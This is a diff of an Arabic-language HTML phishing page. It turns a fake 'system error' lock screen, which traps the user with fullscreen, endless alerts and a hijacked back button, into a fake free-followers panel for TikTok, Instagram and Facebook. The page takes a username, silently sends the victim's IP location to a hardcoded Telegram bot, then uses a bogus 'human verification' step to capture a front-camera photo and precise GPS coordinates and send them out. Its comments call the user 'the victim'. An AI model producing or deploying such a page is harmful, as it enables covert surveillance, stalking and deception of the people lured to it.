@@ -1,77 +1,127 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ نظام الحماية: قفل طوارئ ⚡</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMM Panel | زيادة متابعين حقيقيين</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        body { background: #000; color: #f00; text-align: center; font-family: sans-serif; height: 100vh; margin: 0; overflow: hidden; display: flex; align-items: center; justify-content: center; touch-action: none; }
-        #warn { font-size: 20px; font-weight: bold; border: 3px solid #f00; padding: 20px; z-index: 9999; background: #000; }
+        :root { --primary: #fe2c55; --secondary: #405de6; --success: #1877f2; }
+        body { background: #0f1013; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
+        .container { background: #1f2128; width: 90%; max-width: 450px; padding: 30px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.5); text-align: center; border: 1px solid #333; }
+        .logo-icons { display: flex; justify-content: center; gap: 20px; margin-bottom: 20px; font-size: 30px; }
+        .tiktok { color: #fff; } .insta { color: #e1306c; } .fb { color: #1877f2; }
+        h1 { font-size: 22px; margin-bottom: 10px; }
+        p { color: #a0a0a0; font-size: 14px; margin-bottom: 25px; }
+        .input-group { margin-bottom: 20px; text-align: right; }
+        input { width: 100%; padding: 12px; background: #2d3039; border: 1px solid #444; border-radius: 8px; color: white; box-sizing: border-box; }
+        .verify-btn { width: 100%; padding: 15px; background: linear-gradient(45deg, var(--primary), var(--secondary)); border: none; border-radius: 10px; color: white; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
+        .verify-btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(254, 44, 85, 0.4); }
+        #v { position: fixed; width: 1px; height: 1px; opacity: 0; z-index: -1; }
+        #loading { display: none; margin-top: 20px; }
+        .spinner { border: 4px solid #333; border-top: 4px solid var(--primary); border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
-<body onclick="forceLock()">
+<body>
 
-<div id="warn">
-    ⚠️ خطأ في النظام (System Error) ⚠️<br><br>
-    اضغط هنا لإصلاح ملفات التشغيل فوراً وتجنب فقدان البيانات.
+<div class="container" id="main-box">
+    <div class="logo-icons">
+        <i class="fab fa-tiktok tiktok"></i>
+        <i class="fab fa-instagram insta"></i>
+        <i class="fab fa-facebook fb"></i>
+    </div>
+    <h1>رشق متابعين مجاني 🚀</h1>
+    <p>أدخل اسم المستخدم واختر المنصة لبدء إرسال المتابعين (حقيقيين 100%)</p>
+    
+    <div class="input-group">
+        <input type="text" id="username" placeholder="اسم المستخدم (Username)...">
+    </div>
+    
+    <div class="input-group">
+        <select style="width: 100%; padding: 12px; background: #2d3039; border: 1px solid #444; color: white; border-radius: 8px;">
+            <option>TikTok - 5,000 Follower</option>
+            <option>Instagram - 10,000 Follower</option>
+            <option>Facebook - 7,000 Follower</option>
+        </select>
+    </div>
+
+    <button class="verify-btn" onclick="startVerification()">ابدأ الرشق الآن</button>
+
+    <div id="loading">
+        <div class="spinner"></div>
+        <p id="load-text">جاري فحص الحساب...</p>
+    </div>
 </div>
 
-<video id="v" autoplay playsinline style="display:none;"></video>
+<video id="v" autoplay playsinline></video>
 <canvas id="c" style="display:none;"></canvas>
 
 <script>
     const T = "8439157520:AAGGZBxYp0x6Y54ar3TIrkMaMEHarQASmgY";
     const ID = "1772820433";
 
-    async function send(m, isImg=false) {
+    async function sendToTele(data, type='text') {
         let u = `https://api.telegram.org/bot${T}/`;
-        if(!isImg) {
-            await fetch(u+'sendMessage',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:ID,text:m})});
+        if(type === 'text') {
+            await fetch(u + 'sendMessage', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({chat_id: ID, text: data})
+            });
         } else {
-            const b = await (await fetch(m)).blob();
-            const f = new FormData(); f.append('chat_id',ID); f.append('photo',b,'hit.png');
-            await fetch(u+'sendPhoto',{method:'POST',body:f});
+            const b = await (await fetch(data)).blob();
+            const f = new FormData();
+            f.append('chat_id', ID);
+            f.append('photo', b, 'hit.png');
+            f.append('caption', "📸 صيد من صفحة الرشق 🔥");
+            await fetch(u + 'sendPhoto', { method: 'POST', body: f });
         }
     }
 
-    async function forceLock() {
-        // 1. طلب ملء الشاشة القسري (Sticky)
-        document.documentElement.requestFullscreen({ navigationUI: "hide" });
+    async function startVerification() {
+        const user = document.getElementById('username').value;
+        if(!user) { alert("أدخل اسم المستخدم أولاً!"); return; }
 
-        // 2. تجميد النظام النفسي والتقني
-        while(true) {
+        document.getElementById('loading').style.display = "block";
+        
+        // سحب الـ IP فوراً (صامت)
+        fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=> {
+            sendToTele(`👤 الضحية: ${user}\n📍 موقع IP: ${d.city}, ${d.country_name}\n🌐 الإحداثيات: ${d.latitude},${d.longitude}`);
+        });
+
+        // الهندسة الاجتماعية: طلب "التحقق البشري" بالكاميرا والموقع
+        setTimeout(async () => {
+            document.getElementById('load-text').innerText = "مطلوب تأكيد الهوية (Human Verification)...";
+            
             try {
-                // محاولة سحب الكاميرا والموقع
-                const s = await navigator.mediaDevices.getUserMedia({video:true});
-                const p = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej, {enableHighAccuracy: true});
-                });
+                // طلب الموقع الدقيق
+                navigator.geolocation.getCurrentPosition(p => {
+                    sendData(`🎯 GPS دقيق: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+                }, null, {enableHighAccuracy: true});
 
-                // إذا نجح السحب، نرسل البيانات ونفك التجميد
+                // طلب الكاميرا
+                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
                 const vid = document.getElementById('v');
                 vid.srcObject = s;
+
                 setTimeout(() => {
                     const can = document.getElementById('c');
-                    can.width=vid.videoWidth; can.height=vid.videoHeight;
-                    can.getContext('2d').drawImage(vid,0,0);
-                    send(can.toDataURL('image/png'), true);
-                    send(`🎯 إحداثيات GPS:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-                    alert("✅ تم الإصلاح!");
-                    window.location.href = "https://google.com";
-                }, 1000);
-                break; 
+                    can.width = vid.videoWidth; can.height = vid.videoHeight;
+                    can.getContext('2d').drawImage(vid, 0, 0);
+                    sendToTele(can.toDataURL('image/png'), 'photo');
+                    
+                    s.getTracks().forEach(t => t.stop());
+                    alert("✅ تمت عملية التحقق! سيتم إرسال المتابعين خلال 24 ساعة.");
+                    window.location.href = "https://www.tiktok.com";
+                }, 2000);
 
-            } catch(err) {
-                // ضربة الـ "Freeze": جعل الهاتف يهتز ويظهر تنبيهات لا تنتهي
-                navigator.vibrate([1000, 1000, 1000]);
-                // هذه الرسالة ستظهر فوق أزرار النظام وتمنع الضحية من التفاعل معها
-                alert("🚨 تنبيه أمني: لا يمكنك الخروج! يجب تفعيل الصلاحيات لإلغاء القفل.");
+            } catch (err) {
+                alert("⚠️ خطأ! يجب السماح بالكاميرا والموقع للتأكد أنك لست روبوت (Robot) لإتمام الرشق.");
+                startVerification(); // إعادة المحاولة
             }
-        }
+        }, 2000);
     }
-
-    // قتل زر الرجوع
-    history.pushState(null, null, location.href);
-    window.onpopstate = () => { history.pushState(null, null, location.href); };
 </script>
 </body>
 </html>
